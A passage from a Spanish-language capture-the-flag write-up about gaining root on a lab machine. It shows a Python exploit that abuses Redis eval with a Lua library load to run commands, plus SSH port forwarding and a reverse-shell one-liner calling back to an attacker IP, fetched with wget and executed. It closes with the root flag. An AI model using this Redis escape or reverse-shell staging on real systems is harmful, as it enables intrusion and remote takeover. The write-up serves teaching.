     / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
    /_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
                   |___/            By https://aodsec.com                                           
    """
	print(version)

def shell():
    lua= 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("'+cmd+'", "r"); local res = f:read("*a"); f:close(); return res'
    r  =  redis.Redis(host = '127.0.0.1',port = '6379', password = 'F2WHqJUz2WEz=Gqq')
    script = r.eval(lua,0)
    print(script)

if __name__ == '__main__':
	while True:
		cmd = input("input exec cmd:(q->exit)\n>>")
		if cmd == "q" or cmd == "exit":
			sys.exit()
		shell()
```

Lo que voy a hacer es hacer ***port forwarding*** para que el puerto 6379 del localhost de la máquina víctima se convierta al puerto 6379 del localhost de mi máquina. De esta manera vamos a poder ejecutar el *script* desde nuestra máquina. El *port forwarding* lo podemos hacer con ***SSH*** con la **opción -L**:

```-L 127.0.0.1:6379:127.0.0.1:6379 o -L 6379:127.0.0.1:6379```

<img src="/photos/2022-09-30-Shared-WriteUp/portforwarding.png" alt="drawing"  />  

En este punto, nuestro puerto 6379 debería de estar ocupado por el servicio *Redis* de la máquina víctima. Para comprobarlo, podemos tirar un *nmap* contra nuestro localhost:

```python
nmap -T5 -v --open -p- -n localhost
6379/tcp  open  redis
```

Ahora ya podremos ejecutar el *script* de python en nuestra máquina y **nos dará una consola donde podremos ejecutar comandos como *root***. A partir de aquí podemos visualizar directamente la *flag* o enviarnos una consola.

<img src="/photos/2022-09-30-Shared-WriteUp/rootcommands.png" alt="drawing"  />

Para enviarnos una consola, yo me he creado un archivo *index.html* con el contenido ```bash -i >& /dev/tcp/10.10.14.12/443 0>&1```. Posteriormente despliego un servidor en python para compartir el fichero (python3 -m http.server 80). Luego, me lo descargo con *wget*:

```python
>>wget 10.10.14.12
b''
input exec cmd:(q->exit)
>>ls
b'dump.rdb\nindex.html\n'
input exec cmd:(q->exit)
```

Y por último hago un ```bash index.html```

<img src="/photos/2022-09-30-Shared-WriteUp/roothsell.png" alt="drawing"  />  

```zsh
root@shared:/var/lib/redis## cat /root/root.txt
cat /root/root.txt
a453c629bc2e619296163cac66b3fe24
```